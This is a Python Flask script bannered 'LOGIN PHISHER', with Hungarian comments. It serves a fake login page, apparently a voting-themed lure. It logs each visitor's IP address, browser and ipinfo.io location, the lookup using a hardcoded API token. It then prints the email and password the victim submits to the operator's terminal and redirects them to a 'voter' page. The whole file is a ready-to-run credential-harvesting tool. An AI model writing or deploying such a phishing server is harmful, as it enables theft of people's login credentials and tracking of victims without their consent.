from flask import Flask, render_template, request, redirect, url_for
import requests
import platform
import os

app = Flask(__name__)

IPINFO_API_KEY = "5f8ea1c410083a"
os.system("pip install flask")
os.system("apt install git")
os.system("clear")

print("\033[34m██╗      ██████╗  ██████╗ ██╗███╗   ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ ")
print("██║     ██╔═══██╗██╔════╝ ██║████╗  ██║    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗")
print("██║     ██║   ██║██║  ███╗██║██╔██╗ ██║    ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝")
print("██║     ██║   ██║██║   ██║██║██║╚██╗██║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗")
print("███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║")
print("╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝")
                                                                                              


@app.route('/')
def login():
    # Felhasználó IP-címének és böngésző adatainak lekérdezése
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # IPInfo API lekérdezés a hely adatainak lekéréséhez
    ipinfo_url = f"https://ipinfo.io/{user_ip}?token={IPINFO_API_KEY}"
    response = requests.get(ipinfo_url)
    location_data = response.json() if response.status_code == 200 else {}

    # Operációs rendszer lekérdezése
    os_info = platform.system()

    # Eredmények kiírása a terminálon
    print(f"\033[36mIp address: {user_ip}")
    print(f"Operating system: {os_info}")
    print(f"Browser: {user_agent}")
    print(f"Location: {location_data.get('city', 'Ismeretlen város')}, {location_data.get('region', 'Ismeretlen régió')}")
    print("waiting for log in")

    # Továbbirányít a bejelentkezési oldalra
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Felhasználó bejelentkezési adatainak lekérése az űrlapról
    email = request.form['email']
    password = request.form['password']

    # Bejelentkezési adatok kiírása a terminálon
    print(f"\033[33mEmail: {email}")
    print(f"Password: {password}")
    print("—" * 30)

    # Továbbirányítás a bejelentkezés utáni oldalra
    return redirect(url_for('voter_page'))

@app.route('/voter')
def voter_page():
    return render_template('voter.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3333)  # or your chosen port
